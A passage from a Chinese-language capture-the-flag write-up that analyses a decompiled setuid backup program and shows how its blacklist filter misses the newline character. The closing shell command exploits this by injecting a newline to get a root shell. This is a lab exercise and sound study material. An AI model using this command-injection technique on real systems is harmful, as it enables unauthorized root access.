      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strstr(argv[3], "//") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( !strcmp(argv[3], "/") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strstr(argv[3], "/etc") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( v24 == 1 )
    displayTarget((char *)argv[3]);
  strcpy(v11, argv[3]);
  v4 = getpid();
  v5 = time(0);
  v6 = clock();
  v7 = mix(v6, v5, v4);
  srand(v7);
  v21 = rand();
  sprintf(name, "/tmp/.backup_%i", v21);
  sprintf(command, "/usr/bin/zip -r -P magicword %s %s > /dev/null", name, v11);
  system(command);
  if ( access(name, 0) == -1 )
  {
    if ( v24 == 1 )
      displayWarning("The target path doesn't exist");
  }
  else
  {
    if ( v24 == 1 )
      displaySuccess("Finished! Encoded backup is below:\n");
    sprintf(command, "/usr/bin/base64 -w0 %s", name);
    system(command);
  }
  if ( v24 == 1 )
    puts("\n");
  remove(name);
  fclose(stream);
  return 0;
}
```

通过代码了解到三个参数的作用如下：

`argv[1]` ，第一个参数如果是`-q` 则不打印这个图案

![](image/image_o0daDtXtCp.png)

`argv[2]` ，第二个参数是认证作用，和`/etc/myplace/keys` 文件匹配token，匹配正确才会往下执行。

![](image/image_uhGTkH9WYP.png)

这里查看`/etc/myplace/keys`，发现`argv[2]`为空的话也可以匹配成功，因为`/etc/myplace/keys`有一行是空

![](image/image_87qdkyurrI.png)

`argv[3]` ，第三个参数有校验值，不能包含`..` `/root` ` ; &`  `` `  ``  `$` `|`  `//`  `/`  `/etc` ，

![](image/image_u8OpxI373X.png)

然后`argv[3]`拼接传入`system()`执行命令

![](image/image_agHBdO0EVc.png)

`argv[3]`的参数校验防止了一些命令注入符号，但是遗漏了换行符 `\n` ，并且`/usr/local/bin/backup`属于admin组，拥有root权限，所以可以直接通过命令注入得到root权限。

第三个参数先输入一个`'`，然后通过enter 键获得换行符，再`/bin/bash #'` 闭合单引号，即可执行获得`root shell`

```bash
tom@node:/$ /usr/local/bin/backup -q '' '
> /bin/bash #'

```

![](image/image_2Cjj7uZVeP.png)
